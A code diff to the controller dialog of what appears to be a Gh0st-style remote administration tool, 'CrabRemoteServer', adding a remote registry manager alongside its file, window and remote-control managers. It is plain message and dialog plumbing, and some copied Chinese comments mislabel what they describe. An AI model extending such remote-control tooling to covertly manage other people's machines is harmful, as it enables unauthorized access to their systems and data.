@@ -145,6 +145,7 @@ BEGIN_MESSAGE_MAP(CCrabRemoteServerDlg, CDialogEx)
 	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)
 	ON_MESSAGE(UM_OPEN_REMOTE_CONTROLLER_DIALOG, OnOpenRemoteControllerDialog)
 	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)
+	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)
 END_MESSAGE_MAP()
 
 
@@ -455,7 +456,7 @@ VOID CCrabRemoteServerDlg::OnButtonFileManager()
 
 VOID CCrabRemoteServerDlg::OnButtonAudioManager()
 {
-	//MessageBox("OnButtonAudioManager");
+
 	return VOID();
 }
 
@@ -480,6 +481,8 @@ VOID CCrabRemoteServerDlg::OnButtonServiceManager()
 VOID CCrabRemoteServerDlg::OnButtonRegisterManager()
 {
 	//MessageBox("OnButtonRegisterManager");
+	BYTE	IsToken = CLIENT_REGISTER_MANAGER_REQUIRE;
+	SendingSelectedCommand(&IsToken, sizeof(BYTE));
 	return VOID();
 }
 
@@ -687,7 +690,11 @@ VOID CCrabRemoteServerDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)
 		CFileManagerDlg* Dialog = (CFileManagerDlg*)ContextObject->FileDlg;
 		Dialog->OnReceiveComplete();
 	}
-
+	if (ContextObject->DlgIdentity == REGISTER_MANAGER_DIALOG)
+	{
+		CRegisterManagerDlg* Dialog = (CRegisterManagerDlg*)ContextObject->RegisterDlg;
+		Dialog->OnReceiveComplete();
+	}
 
 	switch (ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])   //[13][]
 	{
@@ -800,6 +807,13 @@ VOID CCrabRemoteServerDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)
 
 		//接到客户端发过来的位图信息
 		__ServerProjectDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
+		break;
+	}
+	case CLIENT_REGISTER_MANAGER_REPLY:
+	{
+
+		//接到客户端发过来的位图信息
+		__ServerProjectDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
 	}
@@ -1144,6 +1158,25 @@ LRESULT CCrabRemoteServerDlg::OnOpenFileManagerDialog(WPARAM ParameterData1, LPA
 	{
 		ContextObject->DlgIdentity = FILE_MANAGER_DIALOG;
 		ContextObject->FileDlg = Dialog;
+	}
+
+	return 0;
+}
+
+LRESULT CCrabRemoteServerDlg::OnOpenRegisterManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
+{
+	//创建一个远程消息对话框
+	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
+	//非阻塞对话框
+	CRegisterManagerDlg* Dialog = new CRegisterManagerDlg(this, m_IocpServer, ContextObject);
+	// 设置父窗口为卓面
+	Dialog->Create(IDD_REGISTER_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
+	Dialog->ShowWindow(SW_SHOW);
+
+	if (ContextObject != NULL)
+	{
+		ContextObject->DlgIdentity = REGISTER_MANAGER_DIALOG;
+		ContextObject->RegisterDlg = Dialog;
 	}
 
 	return 0;
